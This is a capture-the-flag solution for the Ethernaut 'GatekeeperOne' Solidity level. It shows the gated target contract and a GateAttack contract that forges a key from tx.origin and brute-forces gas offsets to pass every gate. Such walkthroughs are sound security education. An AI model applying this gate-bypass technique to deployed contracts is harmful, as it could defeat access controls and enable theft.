# GatekeeperOne

**HINT:** Look back at the Telephone and Token levels. Along with reading through the info given [here.](https://medium.com/coinmonks/ethernaut-lvl-13-gatekeeper-1-walkthrough-how-to-calculate-smart-contract-gas-consumption-and-eb4b042d3009) It will really help you understand gas usage and datatype conversions.
<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.6.0;

contract GatekeeperOne {


  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft()%8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GateAttack {

  constructor(address GatekeeperOneContractAddress) public {
    bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);

    bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"),
      key
    );


    for (uint256 i = 0; i < 120; i++) {
      (bool result, bytes memory data) = address(GatekeeperOneContractAddress).call.gas(
          i + 150 + 8191 * 3
        )(
          encodedParams
        );
      if(result)
        {
        break;
      }
    }
  }
}
``` 
All you have to do is deploy with you instance address. Double check you are now the with entrant:
```js
await contract.entrant()
````